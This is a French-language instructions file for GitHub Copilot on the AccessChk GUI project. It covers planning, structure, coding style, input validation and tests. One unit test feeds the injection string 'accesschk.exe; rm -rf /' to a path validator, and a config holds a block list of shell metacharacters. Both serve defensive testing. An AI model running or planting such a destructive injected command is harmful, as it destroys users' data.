# 🤖 Instructions GitHub Copilot - Projet AccessChk GUI

**Date de création** : 11 novembre 2025  
**Dernière mise à jour** : 11 novembre 2025  
**Version** : 1.0

---

## 🎯 Règles Générales

### 0. Workflow de Planification - NOUVEAU SYSTÈME

**Pour toute nouvelle fonctionnalité ou modification majeure** :

#### 📋 Créer un document de planification

**Emplacement** : `.planning/YYYY-MM-DD_description-courte.md`  
**Template** : Utiliser `.planning/TEMPLATE.md`

**Quand créer un document de planification ?**
- ✅ Nouvelle fonctionnalité GUI demandée
- ✅ Modification majeure de l'architecture
- ✅ Refactorisation importante
- ✅ Ajout de plusieurs fonctionnalités interconnectées
- ✅ Modification du système de sécurité/validation
- ❌ Simple bug fix (sauf si complexe)
- ❌ Modification mineure de documentation
- ❌ Ajout d'un seul test unitaire

**Structure obligatoire du document** :
1. **Vue d'ensemble** : Description, objectif, impact
2. **Planification par étapes** : Étapes détaillées avec actions et validations
3. **Suivi des progrès** : Timeline, progression, journal des modifications
4. **Questions de clarification** : Questions ouvertes, décisions prises, points d'attention
5. **Détails techniques** : Dépendances, modifications, tests
6. **Documentation à mettre à jour** : Liste des docs concernées
7. **Checklist finale** : Validation avant commit

**Workflow type** :
```
1. Utilisateur fait une demande
2. ⚠️ AVANT TOUT CODE : Créer document de planification
3. Proposer les étapes à l'utilisateur
4. Obtenir validation/clarifications
5. Exécuter étape par étape
6. Mettre à jour progression dans le document
7. Finaliser (tests + docs)
8. Checklist finale avant commit
```

**Mise à jour du document** :
- ✅ Mettre à jour après chaque étape terminée
- ✅ Ajouter questions au fur et à mesure
- ✅ Logger toutes les décisions importantes
- ✅ Marquer progrès dans la timeline

**Nommage des fichiers** :
- Format : `YYYY-MM-DD_description-courte.md`
- Exemples :
  - `2025-11-11_ajout-export-pdf.md`
  - `2025-11-11_integration-analyse-permissions.md`
  - `2025-11-11_refonte-systeme-filtrage.md`

**Ce dossier est gitignored** : Les documents de planification sont des work-in-progress et ne doivent pas être versionnés.

---

### 1. Structure du Projet - ORGANISATION RECOMMANDÉE

**Objectif** : Structure professionnelle avec séparation claire des responsabilités

> **"À la racine on ne devrait avoir que le lanceur et le README"**  
> — Règle d'or pour un projet professionnel

**Structure recommandée** (à migrer progressivement) :
```
accesschk_GUI/
├── AccessChkGUI.py              # Lanceur principal (fichier simple qui importe depuis src/)
├── README.md                    # Documentation utilisateur
├── .gitignore                   # Configuration Git
│
├── src/                         # Code source
│   ├── __init__.py
│   ├── gui.py                   # Interface Tkinter principale
│   ├── scanner.py               # Logique d'exécution accesschk
│   ├── validation.py            # Fonctions de validation sécurité
│   ├── export.py                # Gestionnaire d'exports multi-formats
│   ├── history.py               # Gestionnaire d'historique
│   ├── config.py                # Configuration (AppConfig)
│   └── utils.py                 # Utilitaires (encodage, etc.)
│
├── tests/                       # Tests unitaires
│   ├── __init__.py
│   ├── test_validation.py
│   ├── test_scanner.py
│   ├── test_export.py
│   ├── test_filtering.py
│   └── test_suite.py            # Suite complète
│
├── docs/                        # Documentation
│   ├── AMELIORATIONS.md
│   ├── NOUVELLES_FONCTIONNALITES.md
│   ├── ARCHITECTURE.md
│   └── CHANGELOG.md
│
├── scripts/                     # Scripts utilitaires
│   ├── build_gui.ps1            # Build PyInstaller
│   ├── run_tests.ps1            # Exécution tests
│   └── diagnostic_scan.py       # Diagnostic
│
├── tools/                       # Outils externes
│   └── accesschk.exe            # Outil Sysinternals (gitignored)
│
└── .planning/                   # Planifications (gitignored)
    └── TEMPLATE.md
```

**Structure actuelle** (transition) :
```
accesschk_GUI/
├── accesschk_gui_tk.py         # À REFACTORISER → src/gui.py + src/scanner.py
├── accesschk.exe                # À DÉPLACER → tools/accesschk.exe
├── README.txt                   # À RENOMMER → README.md
├── build_gui.ps1                # À DÉPLACER → scripts/build_gui.ps1
├── test_*.py                    # À DÉPLACER → tests/
├── AMELIORATIONS.md            # À DÉPLACER → docs/
├── NOUVELLES_FONCTIONNALITES.md # À DÉPLACER → docs/
└── __pycache__/                 # À GITIGNORER
```

**Plan de migration** (progressif) :
1. ✅ Créer structure de dossiers vides
2. ✅ Déplacer documentation → `docs/`
3. ✅ Déplacer tests → `tests/`
4. ✅ Déplacer scripts → `scripts/`
5. ✅ Déplacer accesschk.exe → `tools/`
6. ⏳ Refactoriser `accesschk_gui_tk.py` → modules dans `src/`
7. ⏳ Créer lanceur simple `AccessChkGUI.py`
8. ✅ Mettre à jour imports et chemins
9. ✅ Vérifier tous les tests
10. ✅ Mettre à jour documentation

**Règles pour la nouvelle structure** :
- ✅ Racine propre : Uniquement `AccessChkGUI.py`, `README.md`, `.gitignore`
- ✅ Code dans `src/` : Modules logiques et réutilisables
- ✅ Tests dans `tests/` : Organisation miroir de `src/`
- ✅ Docs dans `docs/` : Toute la documentation
- ✅ Outils dans `tools/` : Binaires et dépendances externes
- ❌ **JAMAIS** de fichiers `.py` à la racine (sauf lanceur)
- ❌ **JAMAIS** de fichiers `.md` à la racine (sauf README.md)

---

## ⚙️ Contraintes Techniques

### Python
- **Version recommandée** : Python 3.10+
- **Versions supportées** : 3.8, 3.9, 3.10, 3.11, 3.12
- **Module GUI** : Tkinter (inclus dans Python)

### Dépendances
- **Tkinter** : Interface graphique (standard library)
- **Aucune dépendance externe** : Le projet fonctionne avec Python standard
- **Futures dépendances possibles** :
  - `pytest` : Framework de tests plus moderne (alternative à unittest)
  - `black` : Formatage automatique du code
  - `pylint` / `flake8` : Linting et qualité de code
  - `reportlab` / `fpdf2` : Export PDF (si feature demandée)

### Structure des modules (après refactorisation)

**`src/config.py`** : Configuration centralisée
```python
class AppConfig:
    """Configuration centralisée de l'application."""
    # Performance
    BATCH_SIZE = 50
    BATCH_TIMEOUT_MS = 25
    # Sécurité
    MAX_PATH_LENGTH = 260
    DANGEROUS_CHARS = ['&', '|', ';', '$', '`', '<', '>']
    # ...
```

**`src/validation.py`** : Validation et sécurité
```python
def validate_executable_path(path: str) -> Tuple[bool, str]:
    """Validate executable path for security."""
    
def validate_target_paths(paths: List[str]) -> List[str]:
    """Validate and sanitize target paths."""
    
def sanitize_command_args(*args) -> List[str]:
    """Sanitize command arguments against injection."""
```

**`src/scanner.py`** : Exécution accesschk
```python
class AccessChkRunner:
    """Execute accesschk.exe with proper validation."""
    
    def run_scan(self, targets: List[str], principal: str) -> ScanResult:
        """Execute scan and return results."""
```

**`src/export.py`** : Export multi-formats
```python
class ExportManager:
    """Handle exports to TXT, CSV, JSON, XML."""
    
    def export_to_json(self, data: List[str], filepath: Path) -> bool:
        """Export scan results to JSON format."""
```

**`src/gui.py`** : Interface Tkinter
```python
class AccessChkGUI:
    """Main Tkinter GUI application."""
    
    def __init__(self):
        self.config = AppConfig()
        self.scanner = AccessChkRunner()
        self.export_manager = ExportManager()
```

**`src/utils.py`** : Utilitaires
```python
def decode_bytes_with_fallback(data: bytes) -> str:
    """Decode bytes with UTF-8/CP1252/Latin-1 fallback."""
    
def extract_first_path(line: str) -> Optional[str]:
    """Extract first valid path from line."""
```

### Outil externe
- **accesschk.exe** : Outil Sysinternals (doit être dans le même dossier que le GUI)
- **Téléchargement** : https://learn.microsoft.com/sysinternals/downloads/accesschk

### Plateforme
- **Windows uniquement** : Le projet utilise `accesschk.exe` de Sysinternals
- **Droits admin** : Recommandés pour scanner tous les dossiers système
- **Détection automatique** : `is_running_elevated()` vérifie les droits

### Encodage & Unicode
- **Toujours** UTF-8 pour les fichiers Python (`# -*- coding: utf-8 -*-`)
- **Gestion des erreurs d'encodage** : `decode_bytes_with_fallback()` gère CP1252/Latin-1
- **Normalisation Unicode** : `_normalize_for_error_matching()` pour comparaisons

### Sécurité
- **Validation stricte** : Tous les chemins sont validés avant exécution
- **Protection injection** : `sanitize_command_args()` échapper les arguments
- **Caractères dangereux** : `&`, `|`, `;`, `$`, `` ` ``, `<`, `>` interdits
- **Longueur max** : 260 caractères pour les chemins Windows

### Limitations connues
- Performances : Ralentissement possible avec + de 10 000 lignes affichées
- Encodage : Certains caractères spéciaux peuvent poser problème sur Windows
- accesschk.exe : Doit être présent dans le même dossier

---

## 🎨 Standards de Code Python

### Style général
- **PEP 8** pour la mise en forme de base
- **Type hints** obligatoires pour toutes les fonctions publiques
- **Docstrings** complètes avec format Google :
  ```python
  def ma_fonction(param: str) -> bool:
      """Description courte sur une ligne.
      
      Description longue optionnelle expliquant le comportement,
      les cas particuliers, et les effets de bord.
      
      Args:
          param: Description du paramètre
          
      Returns:
          Description de la valeur de retour
          
      Raises:
          ValueError: Quand la valeur est invalide
      """
  ```
- **Imports** : stdlib → third-party (Tkinter) → local (séparés par ligne vide)

### Gestion des erreurs
- **TOUJOURS** utiliser des exceptions spécifiques :
  ```python
  # ✅ BON
  try:
      result = subprocess.run(cmd, capture_output=True)
  except subprocess.SubprocessError as e:
      logging.error(f"Erreur d'exécution: {e}")
  except FileNotFoundError as e:
      logging.error(f"Fichier introuvable: {e}")
  
  # ❌ MAUVAIS
  try:
      result = subprocess.run(cmd, capture_output=True)
  except Exception:  # Trop générique
      pass
  ```

- **Logger les erreurs** avec le module `logging` :
  ```python
  logging.basicConfig(
      filename="accesschk_gui.log",
      level=logging.INFO,
      format="%(asctime)s - %(levelname)s - %(message)s"
  )
  ```

### Configuration centralisée
- **Classe `AppConfig`** : Toutes les constantes dans une classe dédiée
  ```python
  class AppConfig:
      """Configuration centralisée de l'application."""
      
      # Performance
      BATCH_SIZE = 50
      BATCH_TIMEOUT_MS = 25
      
      # UI
      WINDOW_WIDTH = 1100
      WINDOW_HEIGHT = 800
      
      # Sécurité
      MAX_PATH_LENGTH = 260
      DANGEROUS_CHARS = ['&', '|', ';', '$', '`', '<', '>']
  ```

### Fonctions de sécurité
- **TOUJOURS** utiliser les fonctions de validation :
  - `validate_executable_path()` : Valider chemins d'exécutables
  - `validate_target_paths()` : Valider chemins de cibles
  - `sanitize_command_args()` : Échapper les arguments

### Chemins de fichiers
- **TOUJOURS** utiliser `pathlib.Path` pour les chemins :
  ```python
  from pathlib import Path
  
  # ✅ BON - Chemins relatifs depuis la racine du projet
  PROJECT_ROOT = Path(__file__).parent.parent  # Si dans src/
  TOOLS_DIR = PROJECT_ROOT / "tools"
  DOCS_DIR = PROJECT_ROOT / "docs"
  
  exe_path = TOOLS_DIR / "accesschk.exe"
  if not exe_path.exists():
      raise FileNotFoundError(f"accesschk.exe introuvable: {exe_path}")
  
  # ❌ MAUVAIS - Chemins en dur
  exe_path = "C:\\Tools\\accesschk.exe"  # Non portable
  exe_path = "tools\\accesschk.exe"  # Peut échouer selon le répertoire courant
  ```

### Gestion des imports
- **Imports absolus** depuis la racine du projet :
  ```python
  # ✅ BON - Depuis n'importe quel module
  from src.config import AppConfig
  from src.validation import validate_executable_path
  from src.scanner import AccessChkRunner
  
  # ❌ MAUVAIS - Imports relatifs complexes
  from ..config import AppConfig
  from .validation import validate_executable_path
  ```

- **Organisation des imports** :
  ```python
  # 1. Standard library
  import os
  import sys
  from pathlib import Path
  from typing import List, Optional, Tuple
  
  # 2. Third-party (si ajoutées)
  import pytest
  
  # 3. Local application
  from src.config import AppConfig
  from src.validation import validate_executable_path
  ```

### Exemple de fonction bien structurée
```python
from pathlib import Path
from typing import List, Optional, Tuple
import logging
import subprocess

from src.config import AppConfig
from src.validation import validate_executable_path, sanitize_command_args
from src.utils import decode_bytes_with_fallback

def execute_accesschk(
    exe_path: Path,
    targets: List[str],
    principal: Optional[str] = None
) -> Tuple[bool, str]:
    """Execute accesschk.exe and return results.
    
    This function validates inputs, sanitizes arguments, and executes
    the accesschk tool with proper error handling. It follows the
    principle of fail-fast with detailed error messages.
    
    Args:
        exe_path: Path to accesschk.exe (must be in tools/ directory)
        targets: List of target paths to scan (will be validated)
        principal: Optional principal (user/group) to check permissions
        
    Returns:
        Tuple of (success: bool, output: str)
        - success: True if scan completed without errors
        - output: Scan results or error message
        
    Raises:
        FileNotFoundError: If accesschk.exe doesn't exist
        subprocess.SubprocessError: If execution fails
        ValueError: If validation fails
        
    Example:
        >>> from pathlib import Path
        >>> exe = Path("tools/accesschk.exe")
        >>> targets = ["C:\\Program Files"]
        >>> success, output = execute_accesschk(exe, targets, "Users")
        >>> if success:
        ...     print(f"Found {len(output.splitlines())} results")
    """
    try:
        # 1. Validation des entrées
        is_valid, error = validate_executable_path(str(exe_path))
        if not is_valid:
            logging.error(f"Invalid executable: {error}")
            raise ValueError(f"Validation failed: {error}")
        
        if not targets:
            raise ValueError("No targets provided")
        
        # 2. Construction de la commande sécurisée
        cmd = [str(exe_path), "-nobanner"]
        
        if principal:
            sanitized_principal = sanitize_command_args(principal)
            cmd.extend(["-u", sanitized_principal[0]])
        
        sanitized_targets = sanitize_command_args(*targets)
        cmd.extend(sanitized_targets)
        
        logging.info(f"Executing: {' '.join(cmd[:3])}... ({len(targets)} targets)")
        
        # 3. Exécution avec timeout
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=AppConfig.SCAN_TIMEOUT_SECONDS,
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        )
        
        # 4. Décodage robuste de la sortie
        output = decode_bytes_with_fallback(result.stdout)
        
        # 5. Logging du succès
        lines_count = len(output.splitlines())
        logging.info(f"✅ Scan completed: {lines_count} lines, {len(output)} bytes")
        
        return True, output
        
    except subprocess.TimeoutExpired:
        error_msg = f"Scan timeout after {AppConfig.SCAN_TIMEOUT_SECONDS}s"
        logging.error(error_msg)
        return False, error_msg
        
    except subprocess.CalledProcessError as e:
        error_msg = f"accesschk.exe returned error code {e.returncode}"
        stderr = decode_bytes_with_fallback(e.stderr) if e.stderr else ""
        if stderr:
            error_msg += f": {stderr}"
        logging.error(error_msg)
        return False, error_msg
        
    except subprocess.SubprocessError as e:
        error_msg = f"Subprocess error: {e}"
        logging.error(error_msg)
        return False, error_msg
        
    except (ValueError, FileNotFoundError) as e:
        # Ces exceptions sont déjà loggées, on les propage
        return False, str(e)
        
    except Exception as e:
        # Fallback pour erreurs inattendues
        error_msg = f"Unexpected error: {type(e).__name__}: {e}"
        logging.error(error_msg, exc_info=True)
        return False, error_msg
```

### Exemple de classe bien structurée
```python
from pathlib import Path
from typing import List, Dict, Optional
import logging

from src.config import AppConfig

class ScanHistoryManager:
    """Manage scan history storage and retrieval.
    
    This class handles persistent storage of scan results using JSON format.
    It automatically limits history size and provides filtering capabilities.
    
    Attributes:
        history_file: Path to the JSON history file
        max_entries: Maximum number of history entries to keep
        _history: Cached history data
        
    Example:
        >>> history = ScanHistoryManager(Path("data/history.json"))
        >>> history.add_scan({
        ...     "timestamp": "2025-11-11 10:30:00",
        ...     "targets": ["C:\\Windows"],
        ...     "results_count": 1234
        ... })
        >>> recent = history.get_recent_scans(limit=10)
    """
    
    def __init__(
        self,
        history_file: Path,
        max_entries: int = AppConfig.MAX_HISTORY_ENTRIES
    ):
        """Initialize the history manager.
        
        Args:
            history_file: Path where history JSON will be stored
            max_entries: Maximum entries to keep (default from AppConfig)
        """
        self.history_file = history_file
        self.max_entries = max_entries
        self._history: List[Dict] = []
        
        # Créer le dossier parent si nécessaire
        self.history_file.parent.mkdir(parents=True, exist_ok=True)
        
        # Charger l'historique existant
        self._load_history()
        
        logging.info(f"History manager initialized: {len(self._history)} entries")
    
    def _load_history(self) -> None:
        """Load history from JSON file (private method)."""
        try:
            if self.history_file.exists():
                import json
                with self.history_file.open('r', encoding='utf-8') as f:
                    self._history = json.load(f)
                logging.debug(f"Loaded {len(self._history)} history entries")
            else:
                self._history = []
                logging.debug("No history file found, starting fresh")
        except (json.JSONDecodeError, IOError) as e:
            logging.warning(f"Failed to load history: {e}, starting fresh")
            self._history = []
    
    def _save_history(self) -> bool:
        """Save history to JSON file (private method)."""
        try:
            import json
            with self.history_file.open('w', encoding='utf-8') as f:
                json.dump(self._history, f, indent=2, ensure_ascii=False)
            logging.debug(f"Saved {len(self._history)} history entries")
            return True
        except IOError as e:
            logging.error(f"Failed to save history: {e}")
            return False
    
    def add_scan(self, scan_data: Dict) -> bool:
        """Add a new scan to history.
        
        Args:
            scan_data: Dictionary containing scan metadata
                Required keys: timestamp, targets, results_count
                
        Returns:
            True if successfully added and saved
            
        Raises:
            ValueError: If required keys are missing
        """
        # Validation
        required_keys = ['timestamp', 'targets', 'results_count']
        if not all(key in scan_data for key in required_keys):
            missing = [k for k in required_keys if k not in scan_data]
            raise ValueError(f"Missing required keys: {missing}")
        
        # Ajouter au début de la liste (plus récent en premier)
        self._history.insert(0, scan_data)
        
        # Limiter la taille
        if len(self._history) > self.max_entries:
            removed_count = len(self._history) - self.max_entries
            self._history = self._history[:self.max_entries]
            logging.info(f"Trimmed history: removed {removed_count} old entries")
        
        # Sauvegarder
        return self._save_history()
    
    def get_recent_scans(self, limit: int = 10) -> List[Dict]:
        """Get most recent scans.
        
        Args:
            limit: Maximum number of scans to return
            
        Returns:
            List of scan dictionaries, most recent first
        """
        return self._history[:limit]
    
    def clear(self) -> bool:
        """Clear all history.
        
        Returns:
            True if successfully cleared and saved
        """
        self._history = []
        logging.info("History cleared")
        return self._save_history()
```

---

## 🔤 Conventions de Nommage

### Fichiers Python
- **Lanceur** : `AccessChkGUI.py` (racine - fichier simple)
- **Modules** : `snake_case.py` dans `src/` (ex: `validation.py`, `scanner.py`)
- **Tests** : `test_<nom>.py` dans `tests/` (ex: `test_validation.py`)
- **Scripts** : `snake_case.py` dans `scripts/` (ex: `diagnostic_scan.py`)

### Fichiers PowerShell
- **Scripts** : `snake_case.ps1` dans `scripts/` (ex: `build_gui.ps1`, `run_tests.ps1`)

### Fichiers Documentation
- **Racine** : Uniquement `README.md`
- **Docs/** : Autres docs en `MAJUSCULES.md` (ex: `AMELIORATIONS.md`, `CHANGELOG.md`, `ARCHITECTURE.md`)

### Code Python
- **Variables** : `snake_case` (ex: `scan_results`, `target_paths`)
- **Constantes** : `UPPER_SNAKE_CASE` (ex: `MAX_PATH_LENGTH`, `BATCH_SIZE`)
- **Fonctions** : `snake_case` (ex: `validate_target_paths()`, `execute_scan()`)
- **Classes** : `PascalCase` (ex: `AppConfig`, `AccessChkRunner`, `ExportManager`)
- **Privé** : préfixe `_` (ex: `_update_display_batch()`)

### Noms de widgets Tkinter
- **Widgets** : `type_description` (ex: `btn_scan`, `lbl_status`, `entry_principal`)
- **Variables** : `var_description` (ex: `var_dirs_only`, `var_target_paths`)
- **Frames** : `frame_description` (ex: `frame_controls`, `frame_results`)

### Exemples à suivre
```python
# ✅ BON - Module src/scanner.py
from pathlib import Path
from typing import List, Optional, Tuple
import logging

from src.config import AppConfig
from src.validation import validate_executable_path

class AccessChkRunner:
    """Execute accesschk.exe scans with proper validation."""
    
    SCAN_TIMEOUT_SECONDS = 300
    
    def __init__(self, exe_path: Path):
        """Initialize runner with accesschk.exe path."""
        self.exe_path = exe_path
        self._validate_executable()
    
    def _validate_executable(self) -> None:
        """Private method to validate executable on init."""
        is_valid, error = validate_executable_path(str(self.exe_path))
        if not is_valid:
            raise ValueError(f"Invalid executable: {error}")
    
    def run_scan(
        self,
        targets: List[str],
        principal: Optional[str] = None
    ) -> Tuple[bool, str]:
        """Public method to execute a scan."""
        pass

# ❌ MAUVAIS - Tout dans un seul fichier monolithique
class accesschk_runner:  # snake_case pour classe
    ScanTimeoutSeconds = 300  # PascalCase pour constante
    
    def __init__(self, ExePath):  # PascalCase pour paramètre
        self.ExePath = ExePath  # PascalCase pour attribut
    
    def ValidateExecutable(self):  # PascalCase pour méthode
        pass
```

### Exemple d'organisation d'un module complet
```python
# src/validation.py
"""Security validation functions for AccessChk GUI.

This module provides comprehensive input validation to prevent
command injection attacks and ensure safe execution of accesschk.exe.

Functions:
    validate_executable_path: Validate executable file paths
    validate_target_paths: Validate and sanitize scan targets
    sanitize_command_args: Escape dangerous characters in arguments
    
Example:
    >>> from src.validation import validate_executable_path
    >>> is_valid, error = validate_executable_path("C:\\Tools\\accesschk.exe")
    >>> if not is_valid:
    ...     print(f"Validation failed: {error}")
"""

from pathlib import Path
from typing import List, Tuple
import logging
import os

from src.config import AppConfig

__all__ = [
    'validate_executable_path',
    'validate_target_paths',
    'sanitize_command_args'
]

# Module-level logger
logger = logging.getLogger(__name__)


def validate_executable_path(path: str) -> Tuple[bool, str]:
    """Validate that the provided path is a safe executable file.
    
    This function performs comprehensive security checks:
    - Path length validation (Windows MAX_PATH limit)
    - Dangerous character detection
    - File existence verification
    - Extension validation (.exe only)
    - Filename validation (must be accesschk.exe)
    
    Args:
        path: The file path to validate
        
    Returns:
        Tuple of (is_valid: bool, error_message: str)
        If valid, error_message is empty string
        
    Example:
        >>> is_valid, error = validate_executable_path("C:\\Tools\\accesschk.exe")
        >>> assert is_valid
        >>> is_valid, error = validate_executable_path("C:\\Tools\\hack.exe")
        >>> assert not is_valid
        >>> assert "accesschk.exe" in error
    """
    if not path or not isinstance(path, str):
        return False, "Le chemin est vide ou invalide"
    
    # Normalize and check path length
    try:
        normalized_path = os.path.normpath(path.strip())
        if len(normalized_path) > AppConfig.MAX_PATH_LENGTH:
            return False, f"Le chemin est trop long (max {AppConfig.MAX_PATH_LENGTH} caractères)"
    except (OSError, ValueError) as e:
        logger.warning(f"Path normalization failed: {e}")
        return False, f"Chemin invalide: {str(e)}"
    
    # Check for dangerous characters
    if any(char in normalized_path for char in AppConfig.DANGEROUS_CHARS):
        logger.warning(f"Dangerous characters detected in path: {normalized_path}")
        return False, "Le chemin contient des caractères dangereux"
    
    # Check if file exists
    if not Path(normalized_path).exists():
        return False, f"Le fichier n'existe pas: {normalized_path}"
    
    # Check extension
    if not normalized_path.lower().endswith('.exe'):
        return False, "Le fichier doit avoir l'extension .exe"
    
    # Check filename (must be accesschk.exe)
    filename = Path(normalized_path).name.lower()
    if filename != 'accesschk.exe':
        logger.warning(f"Invalid executable name: {filename} (expected accesschk.exe)")
        return False, "Le fichier doit être accesschk.exe"
    
    logger.debug(f"Executable path validated: {normalized_path}")
    return True, ""


# Autres fonctions du module...
```

---

## 🧪 Tests - RÈGLE ABSOLUE

### ⚠️ Tous les tests doivent valider le comportement attendu

**Règle d'or** : **TOUJOURS** écrire des tests pour les nouvelles fonctionnalités

**Tests existants** :
- `test_suite.py` : Suite complète de tests unitaires
- `test_basic.py` : Tests de base
- `test_features.py` : Tests de nouvelles fonctionnalités
- `test_validation.py` : Tests de validation de sécurité
- `test_filtering.py` : Tests du système de filtrage
- `test_path_extraction.py` : Tests d'extraction de chemins
- `test_program_files.py` : Tests spécifiques Program Files
- `test_comparaison_fix.py` : Tests de comparaison
- `test_nouvelles_fonctionnalites.py` : Tests des nouvelles features
- `test_nouvelle_interface.py` : Tests de l'interface

**✅ CORRECT** :
```powershell
# Exécuter un test spécifique
python test_validation.py

# Exécuter la suite complète
python test_suite.py
```

**❌ INCORRECT** :
```powershell
# Ne pas tester manuellement sans automatisation
# Ne pas modifier le code sans tests
```

**Pourquoi les tests sont obligatoires** :
- ✅ Garantit le bon fonctionnement après modifications
- ✅ Détecte les régressions rapidement
- ✅ Documente le comportement attendu
- ✅ Facilite les refactorisations

**Structure d'un bon test** :
```python
import unittest
from pathlib import Path

class TestValidation(unittest.TestCase):
    """Tests for validation functions."""
    
    def test_validate_executable_path_valid(self):
        """Valid accesschk.exe path should pass validation."""
        # Arrange
        valid_path = "C:\\Tools\\accesschk.exe"
        
        # Act
        is_valid, error = validate_executable_path(valid_path)
        
        # Assert
        self.assertTrue(is_valid)
        self.assertEqual(error, "")
    
    def test_validate_executable_path_dangerous_chars(self):
        """Path with dangerous characters should fail validation."""
        # Arrange
        dangerous_path = "C:\\Tools\\accesschk.exe; rm -rf /"
        
        # Act
        is_valid, error = validate_executable_path(dangerous_path)
        
        # Assert
        self.assertFalse(is_valid)
        self.assertIn("dangereux", error.lower())

if __name__ == "__main__":
    unittest.main()
```

---

## 📝 Avant Toute Modification

### Checklist obligatoire :

1. **Lire le code existant**
   - Vérifier `accesschk_gui_tk.py` pour comprendre la structure
   - Identifier les fonctions/classes concernées
   - Respecter la classe `AppConfig` pour les constantes

2. **Proposer d'abord, ne pas agir directement**
   - Expliquer ce qui sera fait
   - Montrer l'impact (sécurité, performances, UI)
   - Attendre validation de l'utilisateur

3. **Documenter les changements** - ⚠️ RÈGLE ABSOLUE
   - **TOUJOURS** mettre à jour `README.txt` si changement visible par utilisateur
   - **TOUJOURS** mettre à jour `AMELIORATIONS.md` si amélioration technique (sécurité/perfs)
   - **TOUJOURS** mettre à jour `NOUVELLES_FONCTIONNALITES.md` si nouvelle feature
   - Mettre à jour les docstrings des fonctions modifiées

4. **Créer/mettre à jour les tests**
   - Ajouter tests pour nouvelles fonctionnalités
   - Mettre à jour tests existants si comportement change
   - Vérifier que tous les tests passent avant commit

---

## 🔧 Règles Spécifiques par Type de Modification

### Ajout d'une nouvelle fonctionnalité GUI

**Actions obligatoires** :
1. Modifier `accesschk_gui_tk.py` :
   - Ajouter méthode dans classe `AccessChkGUI`
   - Respecter le style existant (Tkinter)
   - Ajouter type hints et docstrings
2. Créer test dans `test_features.py` ou nouveau fichier `test_<feature>.py`
3. Mettre à jour `NOUVELLES_FONCTIONNALITES.md` :
   - Ajouter section décrivant la feature
   - Screenshots ou exemples si possible
4. Mettre à jour `README.txt` si feature visible par utilisateur
5. ❌ **NE JAMAIS** modifier sans tester l'interface

**Exemple** : Ajout d'un bouton "Export PDF"
```
Étapes :
1. Ajouter méthode export_to_pdf() dans AccessChkGUI
2. Créer bouton dans setup_ui()
3. Créer test_export_pdf.py
4. Documenter dans NOUVELLES_FONCTIONNALITES.md
5. Mettre à jour README.txt (section Export)
```

### Ajout d'une fonctionnalité de sécurité

**Actions obligatoires** :
1. Modifier `accesschk_gui_tk.py` :
   - Ajouter fonction de validation si nécessaire
   - Intégrer dans le flux de traitement
2. Créer tests dans `test_validation.py`
3. Mettre à jour `AMELIORATIONS.md` :
   - Section "Sécurité renforcée"
   - Expliquer le problème résolu
4. Logger les nouvelles validations
5. ❌ **NE JAMAIS** relâcher la sécurité existante

**Exemple** : Validation des extensions de fichiers
```
Étapes :
1. Ajouter ALLOWED_EXTENSIONS dans AppConfig
2. Modifier validate_executable_path()
3. Créer test_extension_validation()
4. Documenter dans AMELIORATIONS.md
5. Ajouter logging des validations
```

### Optimisation de performances

**Actions obligatoires** :
1. **Mesurer AVANT** : Identifier le goulot d'étranglement
2. Modifier `accesschk_gui_tk.py` :
   - Optimiser la fonction concernée
   - Ajuster constantes dans `AppConfig` si nécessaire
3. **Mesurer APRÈS** : Vérifier l'amélioration
4. Créer benchmark test si pertinent
5. Mettre à jour `AMELIORATIONS.md` :
   - Section "Optimisation des performances"
   - Mentionner amélioration mesurée (ex: -30% temps)
6. ❌ **NE JAMAIS** optimiser sans mesure

**Exemple** : Optimisation de l'affichage des résultats
```
Étapes :
1. Mesurer temps affichage avec 10000 lignes
2. Modifier _update_display_batch() (batch size, timeout)
3. Ajuster AppConfig.BATCH_SIZE
4. Mesurer nouveau temps
5. Documenter dans AMELIORATIONS.md
```

### Ajout d'un nouveau test

**Actions obligatoires** :
1. Créer test dans `tests/test_<nom>.py`
2. Utiliser pytest (recommandé) ou unittest
3. Suivre structure Arrange-Act-Assert
4. Documenter le test avec docstrings
5. Vérifier que le test passe
6. Ajouter au test_suite.py si utilisation unittest
7. ❌ **NE JAMAIS** créer test sans le faire passer

**Exemple pytest** : Test de la nouvelle feature export
```python
# tests/test_export_formats.py
"""Tests for multi-format export functionality."""

import pytest
from pathlib import Path
import json
import csv

from src.export import ExportManager


class TestExportManager:
    """Tests for ExportManager class."""
    
    @pytest.fixture
    def sample_data(self):
        """Sample scan results for testing."""
        return [
            "RW BUILTIN\\Users",
            "   C:\\Program Files\\App",
            "R  BUILTIN\\Users",
            "   C:\\Windows\\System32",
        ]
    
    @pytest.fixture
    def export_manager(self):
        """Create ExportManager instance."""
        return ExportManager()
    
    def test_export_json_creates_valid_file(
        self,
        export_manager,
        sample_data,
        tmp_path
    ):
        """JSON export should create valid JSON file."""
        # Arrange
        output_file = tmp_path / "export.json"
        
        # Act
        success = export_manager.export_to_json(sample_data, output_file)
        
        # Assert
        assert success
        assert output_file.exists()
        
        with output_file.open('r', encoding='utf-8') as f:
            data = json.load(f)
            assert 'metadata' in data
            assert 'results' in data
            assert len(data['results']) == len(sample_data)
    
    def test_export_csv_creates_valid_file(
        self,
        export_manager,
        sample_data,
        tmp_path
    ):
        """CSV export should create valid CSV file."""
        # Arrange
        output_file = tmp_path / "export.csv"
        
        # Act
        success = export_manager.export_to_csv(sample_data, output_file)
        
        # Assert
        assert success
        assert output_file.exists()
        
        with output_file.open('r', newline='', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            rows = list(reader)
            assert len(rows) > 0
            assert 'permissions' in rows[0]
            assert 'path' in rows[0]
    
    @pytest.mark.parametrize("format_type,extension", [
        ("json", ".json"),
        ("csv", ".csv"),
        ("xml", ".xml"),
    ])
    def test_export_all_formats(
        self,
        export_manager,
        sample_data,
        tmp_path,
        format_type,
        extension
    ):
        """All export formats should work."""
        output_file = tmp_path / f"export{extension}"
        method = getattr(export_manager, f"export_to_{format_type}")
        
        success = method(sample_data, output_file)
        
        assert success
        assert output_file.exists()
        assert output_file.stat().st_size > 0
```

**Exemple unittest** : Test de sécurité
```python
# tests/test_security.py
"""Security tests for validation functions."""

import unittest
from pathlib import Path
import tempfile
import shutil

from src.validation import (
    validate_executable_path,
    sanitize_command_args
)


class TestSecurityValidation(unittest.TestCase):
    """Tests for security validation functions."""
    
    def setUp(self):
        """Setup temp directory for tests."""
        self.temp_dir = Path(tempfile.mkdtemp())
    
    def tearDown(self):
        """Cleanup temp directory."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
